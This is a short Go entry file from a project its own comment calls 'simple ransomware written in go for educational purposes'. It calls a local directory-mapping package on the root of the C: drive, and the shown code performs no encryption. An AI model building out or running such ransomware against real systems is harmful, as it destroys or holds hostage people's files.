package main

import (
	"rango/pkg/MapDirectories"
)

/*
Simple ransomware written in go for educational purposes
*/

func main() {
	rootDir := "C:/"
	MapDirectories.ReadAllDir(rootDir)
}
